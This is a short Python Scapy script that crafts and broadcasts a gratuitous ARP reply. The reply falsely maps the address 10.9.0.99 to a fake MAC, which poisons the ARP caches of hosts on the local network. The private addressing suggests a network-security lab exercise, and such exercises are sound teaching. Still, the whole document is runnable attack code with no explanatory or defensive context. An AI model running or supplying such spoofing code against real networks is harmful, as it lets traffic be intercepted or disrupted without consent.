#!/usr/bin/env python3
from scapy.all import *

IP_V = "10.9.0.5"
MAC_V_real = "02:42:0a:09:00:05"
IP_T = "10.9.0.99"
MAC_T_fake ="aa:bb:cc:dd:ee:ff"

IP_fake = "10.9.0.99"
ether= Ether(src = "aa:bb:cc:dd:ee:ff" , dst = "ff:ff:ff:ff:ff:ff")
arp = ARP(psrc = IP_fake, hwsrc = "aa:bb:cc:dd:ee:ff" , pdst =IP_fake, hwdst="ff:ff:ff:ff:ff:ff")
arp.op = 2
frame = ether/arp
sendp(frame)
